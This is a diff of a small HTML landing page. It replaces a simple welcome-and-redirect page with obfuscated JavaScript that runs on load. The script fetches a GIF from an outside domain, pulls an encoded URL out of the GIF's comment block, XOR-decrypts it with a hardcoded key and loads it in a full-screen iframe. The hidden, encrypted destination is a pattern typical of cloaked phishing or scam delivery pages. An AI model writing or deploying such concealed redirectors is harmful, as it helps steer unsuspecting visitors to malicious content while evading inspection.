@@ -1,53 +1,114 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html>
 <head>
   <meta charset="UTF-8" />
-  <title>加载中...</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>...</title>
   <style>
-    html, body {
-      height: 100%;
-      margin: 0;
-      padding: 0;
-    }
-    #tip {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #f0f0f0;
-      text-align: center;
-      font-size: 20px;
-      padding: 20px 30px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
-    @media (max-width: 768px) {
-      #tip {
-        font-size: 16px;
-        padding: 15px 20px;
-      }
-    }
+    body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; }
+    #loader { display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); }
+    .content-iframe { display:block; width:100%; height:100vh; border:none; overflow:auto; -webkit-overflow-scrolling:touch; }
   </style>
 </head>
 <body>
+  <div id="loader">请稍等</div>
+  <div id="container"></div>
 
-  <!-- 居中提示 -->
-  <div id="tip">你好，欢迎访问！</div>
 
-  <script>
-    // 获取完整查询参数
-    const queryString = window.location.search;
-
-    const urlParams = new URLSearchParams(queryString);
-    if (urlParams.has('data')) {
-      // 有 data 参数，1 秒后直接整页跳转
-      setTimeout(() => {
-        window.location.href = 'https://gkog.junenxc.cn/tp.html' + queryString;
-      }, 1000);
-    } else {
-      document.getElementById('tip').innerText = '网站开发中';
+    <script>
+//<![CDATA[
+(function(){
+    var _0x4e8b = ['charCodeAt','fromCharCode','length','getElementById','display','style','block','none','content-iframe','frameborder','scrolling','auto','innerHTML','appendChild','Missing required parameter: data','Invalid data format','No valid data found in GIF','Network response was not ok','Error loading content','Error: ','XMLHttpRequest','image/gif','special-key-123','no-cache','no-store','YourSecretKey123!@#'];
+    var _0x2f = function(idx) { return _0x4e8b[idx]; };
+    
+    function getUrlParams() {
+        var _p = new URLSearchParams(window.location.search);
+        var _d = _p.get('data');
+        if (!_d) throw new Error(_0x2f(14));
+        return { data: _d };
     }
-  </script>
+
+    function xorDecrypt(_s, _k) {
+        var _r = '', _l = _k[_0x2f(2)];
+        for(var _i = 0; _i < _s[_0x2f(2)]; _i++) {
+            _r += String[_0x2f(1)](_s[_0x2f(0)](_i) ^ _k[_0x2f(0)](_i % _l));
+        }
+        return _r;
+    }
+
+    function extractUrlFromGif(_r) {
+        return new Promise(function(_rs, _rj) {
+            _r.arrayBuffer().then(function(_b) {
+                var _d = new Uint8Array(_b);
+                var _i = 0;
+                while (_i < _d[_0x2f(2)] - 1) {
+                    if (_d[_i] === 0x21 && _d[_i + 1] === 0xFE) {
+                        var _l = _d[_i + 2];
+                        var _e = _d.slice(_i + 3, _i + 3 + _l);
+                        var _dc = new TextDecoder();
+                        var _u = _dc.decode(_e);
+                        try {
+                            var _ed = atob(_u);
+                            var _k = _0x2f(25);
+                            _rs(xorDecrypt(_ed, _k));
+                        } catch(_e) {
+                            _rj(new Error(_0x2f(15)));
+                        }
+                    }
+                    _i++;
+                }
+                _rj(new Error(_0x2f(16)));
+            });
+        });
+    }
+
+    function createIframe(_s) {
+        var _c = document[_0x2f(3)]('container');
+        var _i = document.createElement('iframe');
+        _i.className = _0x2f(8);
+        _i.src = _s;
+        _i.setAttribute(_0x2f(9), '0');
+        _i.setAttribute(_0x2f(10), _0x2f(11));
+        _c[_0x2f(12)] = '';
+        _c[_0x2f(13)](_i);
+        return _i;
+    }
+
+    async function loadContent() {
+        var _l = document[_0x2f(3)]('loader');
+        _l[_0x2f(5)][_0x2f(4)] = _0x2f(6);
+        
+        try {
+            var _p = getUrlParams();
+            var _u = 'https://metoo.junenbc.cn/api.php?data=' + _p.data;
+            var _r = await fetch(_u, {
+                method: 'GET',
+                headers: {
+                    'X-Requested-With': _0x2f(20),
+                    'Accept': _0x2f(21),
+                    'Custom-Client': _0x2f(22),
+                    'Cache-Control': _0x2f(23),
+                    'Pragma': _0x2f(23)
+                },
+                cache: _0x2f(24)
+            });
+
+            if (!_r.ok) throw new Error(_0x2f(17));
+
+            var _t = await extractUrlFromGif(_r);
+            var _i = createIframe(_t);
+            _l[_0x2f(5)][_0x2f(4)] = _0x2f(7);
+        } catch(_e) {
+            console.error(_0x2f(19), _e);
+            _l.textContent = _e.message || _0x2f(18);
+        }
+    }
+
+    window.onload = loadContent;
+})();
+//]]>
+    </script>
+
 </body>
 </html>
